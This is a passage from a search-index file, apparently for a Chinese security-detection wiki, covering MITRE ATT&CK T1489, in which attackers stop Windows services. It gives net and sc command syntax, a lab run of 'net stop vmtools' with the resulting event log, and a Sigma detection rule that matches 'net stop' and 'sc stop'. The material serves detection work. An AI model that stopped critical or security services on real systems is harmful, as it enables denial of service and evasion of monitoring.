\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u7528\u4e8e\u67e5\u770b\u5173\u952e\u8fdb\u7a0b\u662f\u8fd0\u884c\u8fd8\u662f\u505c\u6b62\u8fd0\u884c\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1489 https://attack.mitre.org/techniques/T1489/ \u4f7f\u7528Windows\u547d\u4ee4\u884c\u542f\u52a8\u5173\u95ed\u670d\u52a1(net,sc\u7528\u6cd5) https://www.cnblogs.com/qlqwjy/p/8010598.html","title":"T1489-win-\u505c\u6b62\u670d\u52a1"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#t1489-win-","text":"","title":"T1489-win-\u505c\u6b62\u670d\u52a1"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u505c\u6b62\u6216\u7981\u7528\u7cfb\u7edf\u4e0a\u7684\u670d\u52a1\uff0c\u4ee5\u4f7f\u5408\u6cd5\u7528\u6237\u65e0\u6cd5\u4f7f\u7528\u8fd9\u4e9b\u670d\u52a1\u3002\u505c\u6b62\u5173\u952e\u670d\u52a1\u53ef\u4ee5\u6291\u5236\u6216\u505c\u6b62\u8fd9\u4e9b\u670d\u52a1\u5bf9\u653b\u51fb\u8005\u5165\u4fb5\u76f8\u5173\u4e8b\u4ef6\u7684\u54cd\u5e94\uff0c\u6216\u8005\u5e2e\u52a9\u653b\u51fb\u8005\u5bf9\u7cfb\u7edf\u73af\u5883\u8fdb\u884c\u7834\u574f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u7981\u7528\u5bf9\u7ec4\u7ec7\u5f88\u91cd\u8981\u7684\u5355\u4e2a\u670d\u52a1\u6765\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\uff0c\u4f8b\u5982MSExchangeIS\uff0c\u8fd9\u56de\u5bfc\u81f4Exchange\u5185\u5bb9\u65e0\u6cd5\u8bbf\u95ee\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u505c\u6b62\u6216\u7981\u7528\u8bb8\u591a\u6216\u6240\u6709\u670d\u52a1\uff0c\u4ece\u800c\u4f7f\u7cfb\u7edf\u65e0\u6cd5\u4f7f\u7528\u3002\u670d\u52a1\u53ef\u80fd\u4e0d\u5141\u8bb8\u5728\u8fd0\u884c\u65f6\u4fee\u6539\u5176\u5b58\u50a8\u7684\u6570\u636e\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u505c\u6b62\u670d\u52a1\uff0c\u4ece\u800c\u5bf9Exchange\u548cSQL Server\u7b49\u670d\u52a1\u7684\u5b58\u50a8\u6570\u636e\u8fdb\u884c\u9500\u6bc1\u6570\u636e\u548c\u52a0\u5bc6\u6570\u636e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_1","text":"\u4f7f\u7528Windows\u547d\u4ee4\u884c\u542f\u52a8\u5173\u95ed\u670d\u52a1(net,sc\u7528\u6cd5)\uff0c\u6700\u597d\u662f\u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0b\u4f7f\u7528","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#net","text":"NET\u547d\u4ee4\u662f\u529f\u80fd\u5f3a\u5927\u7684\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u6267\u884c\u7684\u5de5\u5177\u3002 \u5b83\u5305\u542b\u4e86\u7ba1\u7406\u7f51\u7edc\u73af\u5883\u3001\u670d\u52a1\u3001\u7528\u6237\u3001\u767b\u9646\u5927\u90e8\u5206\u91cd\u8981\u7684\u7ba1\u7406\u529f\u80fd\uff0c\u5173\u4e8e\u8fd9\u4e9b\u529f\u80fd\u8fd9\u91cc\u4e0d\u518d\u4e00\u4e00\u8bb2\u89e3\uff0c\u5177\u4f53\u53ef\u53c2\u8003\u5fae\u8f6f\u5b98\u65b9\u8bf4\u660e\u3002 \u542f\u52a8\u548c\u5173\u95ed\u670d\u52a1\u7684\u65f6\u5019\uff0c\u5176\u8bed\u6cd5\u662f\uff1a net start \u670d\u52a1\u540d net stop \u670d\u52a1\u540d","title":"net\u7528\u4e8e\u6253\u5f00\u6ca1\u6709\u88ab\u7981\u7528\u7684\u670d\u52a1"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#sc","text":"\u4f7f\u7528sc\u7a0b\u5e8f(\u4e5f\u53ef\u4ee5\u67e5\u770b\u670d\u52a1\u72b6\u6001)\u53ef\u4ee5\u521b\u5efa\u670d\u52a1\u3001\u5220\u9664\u670d\u52a1\u3001\u6253\u5f00\u4e0e\u5173\u95ed\u670d\u52a1 sc\u662f\u7528\u4e8e\u4e0e\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u548c\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u5176\u8bed\u6cd5\u662f\uff1a sc config \u670d\u52a1\u540d start= demand //\u624b\u52a8 sc config \u670d\u52a1\u540d start= auto //\u81ea\u52a8 sc config \u670d\u52a1\u540d start= disabled //\u7981\u7528 sc start \u670d\u52a1\u540d\u3000\u3000\u5f00\u542f\u670d\u52a1 sc stop \u670d\u52a1\u540d\u3000\u3000\u505c\u6b62\u670d\u52a1 sc query \u670d\u52a1\u540d\u3000\u3000\u67e5\u770b\u670d\u52a1\u72b6\u6001 sc delete \u670d\u52a1\u540d \u5220\u9664\u670d\u52a1 sc qc \u670d\u52a1\u540d \u67e5\u770b\u670d\u52a1\u7684\u914d\u7f6e\u4fe1\u606f sc create scname binPath=xxx.exe\u3000\u3000\u521b\u5efa\u670d\u52a1","title":"sc\u53ef\u7528\u4e8e\u6253\u5f00\u88ab\u7981\u7528\u7684\u670d\u52a1"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_3","text":"\u8fd9\u91cc\u53ea\u6f14\u793a\u4f7f\u7528net\u547d\u4ee4\u5173\u95ed\u670d\u52a1\uff0c\u5229\u7528sc\u547d\u4ee4\u5173\u95ed\u670d\u52a1\u7684\u65b9\u6cd5\uff0c\u5728\u8fd9\u91cc\u4e0d\u505a\u6f14\u793a\u3002 C:\\Users\\Administrator>net stop vmtools VMware Tools \u670d\u52a1\u5df2\u6210\u529f\u505c\u6b62\u3002 C:\\Users\\Administrator>net start vmtools VMware Tools \u670d\u52a1\u6b63\u5728\u542f\u52a8 . VMware Tools \u670d\u52a1\u5df2\u7ecf\u542f\u52a8\u6210\u529f\u3002 \u901a\u8fc7\u89c2\u5bdf\u672c\u5730\u670d\u52a1\u4fe1\u606f\uff0c\u53d1\u73b0vmtools\u670d\u52a1\u5df2\u7ecf\u88ab\u5173\u95ed\u3002\u8bb0\u5f97\u662fnet stop\u540e\u9762\u8ddf\u7684\u662f\u670d\u52a1\u540d\u79f0\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x7169C \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xd9c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\net.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x15d0 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: net stop vmtools","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#sigma","text":"title: windows\u4e0b\u4f7f\u7528net/sc\u547d\u4ee4\u5173\u95ed\u670d\u52a1 description: Windows\u4e0b\u4f7f\u7528net stop/sc stop \u5173\u95ed\u670d\u52a1\uff0c\u7528\u4e8e\u9003\u907f\u76d1\u89c6\u3002 tags: T1489 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Processcommandline|contains: - 'net stop' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c - 'sc stop' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low","title":"sigma\u89c4\u5219"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_6","text":"\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u7528\u4e8e\u67e5\u770b\u5173\u952e\u8fdb\u7a0b\u662f\u8fd0\u884c\u8fd8\u662f\u505c\u6b62\u8fd0\u884c\u3002","title":"\u5efa\u8bae"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/#_7","text":"MITRE-ATT&CK-T1489 https://attack.mitre.org/techniques/T1489/ \u4f7f\u7528Windows\u547d\u4ee4\u884c\u542f\u52a8\u5173\u95ed\u670d\u52a1(net,sc\u7528\u6cd5) https://www.cnblogs.com/qlqwjy/p/8010598.html","title":"\u53c2\u8003\u63a8\u8350"}]}